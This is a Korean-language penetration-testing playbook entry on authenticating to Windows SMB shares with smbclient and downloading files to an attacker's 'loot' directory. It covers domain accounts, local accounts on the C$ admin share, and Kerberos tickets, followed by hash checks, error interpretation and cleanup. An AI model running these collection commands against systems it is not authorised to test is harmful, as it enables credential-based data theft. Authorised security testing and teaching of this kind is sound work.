---
tags:
  - 환경/windows
  - 서비스/smb
시작조건: ["SMB 계정 인증 가능", "대상 공유와 파일 경로 확인"]
필요권한: ["대상 공유와 파일의 읽기 권한"]
필요조건: ["대상 호스트", "공유명", "사용자명과 비밀번호 또는 Kerberos ticket"]
결과: ["공격 호스트로 회수한 파일"]
---

# SMB 인증 공유 파일 수집

## 한 줄 판단

대상 SMB 호스트에 사용할 계정·인증 자료와 읽을 공유·파일 경로를 알고 있다면, `smbclient`로 해당 공유에 인증하고 파일을 공격 호스트로 내려받아 크기와 내용을 확인한다.

## 사용할 때

- 로컬 또는 도메인 계정으로 일반 공유나 `C$`에 접근할 수 있을 때.
- 이미 경로를 아는 파일을 회수하거나 공유 안에서 실제 읽기 가능 범위를 확인할 때.
- SMB 인증 성공과 특정 파일 읽기 성공을 분리해 기록할 때.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 네트워크 경로 | 공격 호스트에서 대상 445/TCP 도달 | TCP 연결 또는 SMB 협상 | 피벗·ProxyChains와 대상 route 확인 |
| 인증 범위 | 로컬·도메인·Kerberos 중 정확한 형식 | `smbclient -L` | `-W`, `DOMAIN\\USER`, ticket·FQDN 형식 확인 |
| 공유 접근 | 대상 공유에 접속 가능 | `ls` | 공유명과 share ACL 확인 |
| 파일 읽기 | 대상 경로에 READ | `allinfo`, `get` | 파일 경로와 NTFS ACL 확인 |

## 실행

먼저 공격 호스트에서 이번 수집 전용 디렉터리를 만들고, 같은 이름의 로컬 파일을 덮어쓰지 않는지 확인한다. 아래 명령은 같은 shell에서 이어서 실행한다.

```bash
LOOT_DIR="$(mktemp -d ./loot-smb.XXXXXX)"
test ! -e "$LOOT_DIR/<LOCAL_FILE>"
```

### 도메인 계정으로 단일 파일 수집

```bash
smbclient //<TARGET>/<SHARE> -W <DOMAIN> -U '<USER>%<PASSWORD>' -c "cd <REMOTE_DIRECTORY>; get <REMOTE_FILE> $LOOT_DIR/<LOCAL_FILE>"
```

### 로컬 계정으로 관리 공유 파일 수집

```bash
smbclient //<TARGET>/C$ -W WORKGROUP -U '<LOCAL_USER>%<PASSWORD>' -c "cd Users\\<TARGET_USER>\\Desktop; get <REMOTE_FILE> $LOOT_DIR/<LOCAL_FILE>"
```

### Kerberos ticket으로 파일 수집

```bash
smbclient //<TARGET_FQDN>/<SHARE> --use-kerberos=required -N -c "get <REMOTE_FILE> $LOOT_DIR/<LOCAL_FILE>"
stat -c '%n %s bytes' "$LOOT_DIR/<LOCAL_FILE>"
sha256sum "$LOOT_DIR/<LOCAL_FILE>"
```

확인할 출력:

- 공유 접속 뒤 `getting file ...`과 로컬 파일 생성·크기를 확인한다.
- `NT_STATUS_LOGON_FAILURE`는 계정·도메인·인증 자료 단계, `NT_STATUS_ACCESS_DENIED`는 공유 또는 파일 ACL 단계부터 확인한다.
- 목록 조회 성공만으로 파일 읽기 성공을 확정하지 않는다.
- 로컬 `stat`과 SHA-256은 수집본의 존재·크기·식별값을 남긴다. 원격 원본과 같은 hash를 직접 구할 수 있을 때만 전송 무결성까지 확정한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| `getting file`과 로컬 파일 생성 | SMB 파일 읽기·전송 성공 | 공격 호스트의 파일 | [[파일 서비스 접근 후 자격 증명과 초기 접근 연결]]에서 내용과 후속 단서 평가 |
| 인증 성공이나 공유 접속 거부 | 계정은 유효하지만 share ACL 부족 | SMB 인증 상태 유지 | 다른 공유와 `netexec smb <TARGET> --shares` 결과 확인 |
| 공유 목록·디렉터리는 보이나 `get` 거부 | 파일 NTFS ACL 또는 경로 문제 | 공유 열거만 가능 | 정확한 원격 경로와 파일별 ACL 확인 |
| 연결 timeout | 인증 전에 네트워크 경로 실패 | 시작 상태 유지 | 445/TCP, 피벗·SOCKS와 대상 route 확인 |

## 확인할 출력과 권한

- SMB 로그인, 공유 접속, 디렉터리 조회와 파일 다운로드는 각각 다른 성공 단계다.
- 관리 공유 `C$` 접근은 일반 공유 READ보다 높은 권한 신호지만 원격 명령 실행이나 SYSTEM 권한을 뜻하지 않는다.

## 변경 영향과 복구

이 절차는 대상 SMB 파일을 변경하지 않지만 공격 호스트의 `$LOOT_DIR`에 수집본을 만든다. 수집본을 보존할 때는 Vault 밖의 승인된 증적 위치로 옮기고, 폐기할 때는 기록한 전용 경로만 처리한다. 디렉터리가 이번 `mktemp`로 생성된 것이고 비어 있음을 확인한 뒤에만 제거한다.

```bash
find "$LOOT_DIR" -maxdepth 1 -type f -printf '%f %s bytes\n'
rm -f -- "$LOOT_DIR/<LOCAL_FILE>"
rmdir -- "$LOOT_DIR"
test ! -e "$LOOT_DIR" && echo 'local collection removed'
```

## 참고 링크

- [Samba smbclient manual](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)

## 관련 서비스

- [[SMB 서비스]]

## 관련 도구

- [[smbclient]]

## 관련 상태 라우터

- [[파일 서비스 접근 후 자격 증명과 초기 접근 연결]]
- [[확보한 자격 증명으로 원격 접근 경로 선택]]
